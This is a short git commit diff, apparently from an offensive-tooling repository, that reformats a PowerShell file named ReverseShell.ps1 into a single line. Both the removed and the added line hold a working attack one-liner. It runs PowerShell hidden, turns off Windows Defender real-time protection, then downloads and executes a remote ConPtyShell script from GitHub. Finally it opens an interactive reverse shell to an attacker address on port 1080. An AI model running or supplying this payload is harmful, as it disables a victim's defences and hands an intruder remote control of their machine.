2eb9ba104540c56094be05114295a1ef48296af0
Ashton Fox <61950589+ashscottf@users.noreply.github.com>
2022-08-11 15:26:42 -0500

    Update ReverseShell.ps1

--- ReverseShell.ps1
+++ ReverseShell.ps1
@@ -1,2 +1,1 @@
-powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V;
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.1.10 -RemotePort 1080 -Rows 30 -Cols 90 -CommandLine powershell.exe;
+powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.1.10 -RemotePort 1080 -Rows 30 -Cols 90 -CommandLine powershell.exe;
